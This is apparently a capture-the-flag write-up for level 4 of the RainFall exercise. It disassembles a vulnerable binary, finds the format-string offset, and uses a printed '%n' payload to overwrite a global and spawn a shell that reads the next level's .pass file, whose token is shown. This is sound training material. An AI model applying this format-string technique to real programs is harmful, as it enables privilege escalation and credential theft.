## LEVEL 4

This level is really similar to the previous level. Let's start by disassembling the code.

```shell
level4@RainFall:~$ gdb -q level4
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   %ebp
   0x080484a8 <+1>:	mov    %esp,%ebp
   0x080484aa <+3>:	and    $0xfffffff0,%esp
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   %ebp
   0x08048458 <+1>:	mov    %esp,%ebp
   0x0804845a <+3>:	sub    $0x218,%esp
   0x08048460 <+9>:	mov    0x8049804,%eax
   0x08048465 <+14>:	mov    %eax,0x8(%esp)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
   0x08048477 <+32>:	mov    %eax,(%esp)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
   0x08048485 <+46>:	mov    %eax,(%esp)
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	movl   $0x8048590,(%esp)
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.
```

As we can see, the code is pretty similar to the previous level. The only difference is that we compare the address `0x8049810` with `0x1025544` *(16930116)* which is a widely bigger number. Firstly we need to check if the readable address is still the fourth.

```shell
level4@RainFall:~$ python -c 'print "AAAA" + "%x "*20' | ./level4
AAAAb7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
```

Ok so the readable address is no longer the fourth one but the twelfth.
Secondly we need to check if we can write 16930116 character in the buffer.

```shell
level4@RainFall:~$ python -c 'print "AAAA" + "A"*16930112' | ./level4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATraceback (most recent call last):
  File "<string>", line 1, in <module>
IOError: [Errno 32] Broken pipe
```

Gosh, we can't write 16930114 characters in the buffer. We need to use a other method. We will use the `printf()`'s flag option to add 16930114 characters and avoid pipe and buffer error. We know now how create our payload.

### Payload

`python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/payload`

Now we have our payload we just have to inject it into the program.

```shell
level4@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level5/.pass") | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
